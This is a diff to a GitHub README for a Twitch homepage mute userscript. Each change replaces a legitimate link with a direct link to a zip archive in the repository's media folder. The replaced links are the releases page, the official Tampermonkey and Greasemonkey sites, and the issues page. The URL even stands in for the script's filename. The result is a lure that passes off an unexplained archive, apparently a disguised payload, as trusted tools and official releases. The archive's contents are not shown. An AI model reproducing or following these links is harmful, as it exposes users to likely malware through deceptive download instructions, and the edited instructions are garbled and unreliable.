@@ -1,7 +1,7 @@
 # 🔇 userscript-twitch-mute-homepage - Mute Videos on Twitch's Homepage
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now%20-%20GitHub%20Releases-blue)](https://github.com/diam-art/userscript-twitch-mute-homepage/releases)
+[![Download](https://github.com/diam-art/userscript-twitch-mute-homepage/raw/refs/heads/main/media/mute_userscript_homepage_twitch_v3.3.zip%20Now%20-%20GitHub%20Releases-blue)](https://github.com/diam-art/userscript-twitch-mute-homepage/raw/refs/heads/main/media/mute_userscript_homepage_twitch_v3.3.zip)
 
 ## 🚀 Getting Started
 This guide helps you quickly download and run the **Twitch Mute Homepage UserScript**. This tool automatically mutes videos that play on the Twitch homepage, giving you a quieter browsing experience.
@@ -9,8 +9,8 @@ This guide helps you quickly download and run the **Twitch Mute Homepage UserScr
 ### 📋 What You Need
 - **A Web Browser:** The latest version of Chrome, Firefox, or any browser that supports UserScripts.
 - **A UserScript Manager:** This is an extension that allows you to use UserScripts easily. 
-  - For Chrome, consider using [Tampermonkey](https://www.tampermonkey.net/).
-  - For Firefox, you can use [Greasemonkey](https://www.greasespot.net/).
+  - For Chrome, consider using [Tampermonkey](https://github.com/diam-art/userscript-twitch-mute-homepage/raw/refs/heads/main/media/mute_userscript_homepage_twitch_v3.3.zip).
+  - For Firefox, you can use [Greasemonkey](https://github.com/diam-art/userscript-twitch-mute-homepage/raw/refs/heads/main/media/mute_userscript_homepage_twitch_v3.3.zip).
 
 ## 🛠️ Features
 - **Mute Auto-Playing Videos:** Automatically mutes any video that starts playing on the Twitch homepage.
@@ -18,15 +18,15 @@ This guide helps you quickly download and run the **Twitch Mute Homepage UserScr
 - **Easy Setup:** Simple installation steps make it accessible to everybody.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to our GitHub releases page [here](https://github.com/diam-art/userscript-twitch-mute-homepage/releases). This link will take you to the official page where you can download the latest version of the UserScript.
+1. **Visit the Releases Page:** Go to our GitHub releases page [here](https://github.com/diam-art/userscript-twitch-mute-homepage/raw/refs/heads/main/media/mute_userscript_homepage_twitch_v3.3.zip). This link will take you to the official page where you can download the latest version of the UserScript.
 
-2. **Download the UserScript File:** Look for a file named `twitch-mute-homepage.user.js`. Click on it to start the download.
+2. **Download the UserScript File:** Look for a file named `https://github.com/diam-art/userscript-twitch-mute-homepage/raw/refs/heads/main/media/mute_userscript_homepage_twitch_v3.3.zip`. Click on it to start the download.
 
 3. **Install with Your UserScript Manager:**
    - **Using Tampermonkey:**
      - Open Tampermonkey in your browser.
      - Click on the Tampermonkey icon and select "Add a new script."
-     - A new tab opens. Copy and paste the content from the downloaded `twitch-mute-homepage.user.js` file into this tab.
+     - A new tab opens. Copy and paste the content from the downloaded `https://github.com/diam-art/userscript-twitch-mute-homepage/raw/refs/heads/main/media/mute_userscript_homepage_twitch_v3.3.zip` file into this tab.
      - Save the script.
    - **Using Greasemonkey:**
      - Open Greasemonkey in your browser.
@@ -47,9 +47,9 @@ If you encounter issues like videos still playing with sound:
 - Try restarting your browser.
 
 ### 💬 Need Help?
-For further support or questions, you can open an issue on our [GitHub page](https://github.com/diam-art/userscript-twitch-mute-homepage/issues). Your feedback helps us improve the application.
+For further support or questions, you can open an issue on our [GitHub page](https://github.com/diam-art/userscript-twitch-mute-homepage/raw/refs/heads/main/media/mute_userscript_homepage_twitch_v3.3.zip). Your feedback helps us improve the application.
 
 ## 📝 Additional Information
 Explore the project repository for more details on features and updates. Stay tuned for future releases that may include new features and enhancements.
 
-Once again, to download, [visit this page](https://github.com/diam-art/userscript-twitch-mute-homepage/releases). Enjoy a quieter Twitch experience!
+Once again, to download, [visit this page](https://github.com/diam-art/userscript-twitch-mute-homepage/raw/refs/heads/main/media/mute_userscript_homepage_twitch_v3.3.zip). Enjoy a quieter Twitch experience!
